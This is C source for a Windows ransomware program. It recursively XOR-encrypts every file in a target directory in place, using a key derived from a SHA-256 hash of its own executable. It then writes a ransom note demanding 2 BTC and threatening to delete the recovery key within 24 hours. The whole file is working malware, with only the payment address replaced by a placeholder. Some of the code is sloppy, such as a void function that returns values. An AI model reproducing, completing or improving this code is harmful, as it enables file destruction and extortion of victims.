#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <openssl/sha.h>
#include <openssl/evp.h>

#define MAX_PATH_LENGTH 1024
#define MIN_FILE_SIZE 1

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

void xor_encrypt(FILE* input_file, FILE* output_file, const unsigned char* key, size_t key_len) {
    int ch;
    size_t i = 0;

    if (!input_file || !output_file || !key || key_len == 0) {
        return;
    }

    while ((ch = fgetc(input_file)) != EOF) {
        fputc(ch ^ key[i % key_len], output_file);
        i++;
    }
}

int directory_exists(const TCHAR* path) {
    if (!path) return 0;

    DWORD ftyp = GetFileAttributesW(path);
    if (ftyp == INVALID_FILE_ATTRIBUTES) {
        return 0;
    }
    return (ftyp & FILE_ATTRIBUTE_DIRECTORY) != 0;
}

void generate_key_from_file(const TCHAR* file_path, unsigned char* key) {
    if (!file_path || !key) return;

    FILE* file;
    errno_t err = _wfopen_s(&file, file_path, L"rb");
    if (err != 0 || !file) {
        fprintf(stderr, "Error: Unable to open file for key generation\n");
        return;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);

    if (file_size < MIN_FILE_SIZE) {
        fclose(file);
        return;
    }

    fseek(file, 0, SEEK_SET);

    unsigned char* file_data = (unsigned char*)calloc(file_size, 1);
    if (!file_data) {
        fclose(file);
        return;
    }

    if (fread(file_data, 1, file_size, file) != (size_t)file_size) {
        free(file_data);
        fclose(file);
        return;
    }
    fclose(file);

    EVP_MD_CTX* ctx = EVP_MD_CTX_new();
    if (!ctx) {
        free(file_data);
        return;
    }

    if (EVP_DigestInit_ex(ctx, EVP_sha256(), NULL) != 1 ||
        EVP_DigestUpdate(ctx, file_data, file_size) != 1 ||
        EVP_DigestFinal_ex(ctx, key, NULL) != 1) {
        EVP_MD_CTX_free(ctx);
        free(file_data);
        return;
    }

    EVP_MD_CTX_free(ctx);
    free(file_data);
}

void process_directory(const TCHAR* input_dir, const unsigned char* key, size_t key_len) {
    if (!input_dir || !key || key_len == 0) return;

    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    TCHAR search_path[MAX_PATH];
    TCHAR input_path[MAX_PATH];
    errno_t err;

    if (swprintf_s(search_path, MAX_PATH, L"%s\\*", input_dir) == -1) {
        fprintf(stderr, "Error: Path too long\n");
        return;
    }

    hFind = FindFirstFileW(search_path, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error: Unable to open directory\n");
        return;
    }

    do {
        if (wcscmp(findFileData.cFileName, L".") == 0 ||
            wcscmp(findFileData.cFileName, L"..") == 0) {
            continue;
        }

        if (swprintf_s(input_path, MAX_PATH, L"%s\\%s", input_dir, findFileData.cFileName) == -1) {
            continue;
        }

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            process_directory(input_path, key, key_len);
        }
        else {
            FILE* input_file = NULL, * output_file = NULL;

            err = _wfopen_s(&input_file, input_path, L"rb");
            if (err != 0 || !input_file) continue;

            err = tmpfile_s(&output_file);
            if (err != 0 || !output_file) {
                fclose(input_file);
                continue;
            }

            xor_encrypt(input_file, output_file, key, key_len);

            fclose(input_file);
            input_file = NULL;

            err = _wfopen_s(&input_file, input_path, L"wb");
            if (err == 0 && input_file) {
                int ch;
                rewind(output_file);
                while ((ch = fgetc(output_file)) != EOF) {
                    fputc(ch, input_file);
                }
                fclose(input_file);
            }

            fclose(output_file);
        }

    } while (FindNextFileW(hFind, &findFileData) != 0);

    FindClose(hFind);
}

void ransom_file() {
    FILE* file;

    file = fopen("README.steps", "w");

    if (file == NULL) {
        printf("Error: Could not create or open the file.\n");
        return 1;
    }

    fprintf(file, "\nYOUR FILES HAVE BEEN ENCRYPTED!\n");
    fprintf(file, "PAY A RANSOM OF 2 BTC TO THE FOLLOWING ADDRESS: {this is illegal}\n");
    fprintf(file, "WE WILL DELETE THE RECOVERY KEY IN 24 HOURS TIME!\n");

    fclose(file);

    return 0;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 2) {
        fwprintf(stderr, L"Usage: %s <directory>\n", argv[0]);
        return 1;
    }

    const TCHAR* input_dir = argv[1];

    if (!directory_exists(input_dir)) {
        fwprintf(stderr, L"Error: Invalid directory path\n");
        return 1;
    }

    TCHAR exe_path[MAX_PATH];
    if (GetModuleFileNameW(NULL, exe_path, MAX_PATH) == 0) {
        fprintf(stderr, "Error: Unable to get executable path\n");
        return 1;
    }

    unsigned char key[EVP_MAX_MD_SIZE] = { 0 };
    generate_key_from_file(exe_path, key);

    process_directory(input_dir, key, EVP_MAX_MD_SIZE);

    ransom_file();

    return 0;
}
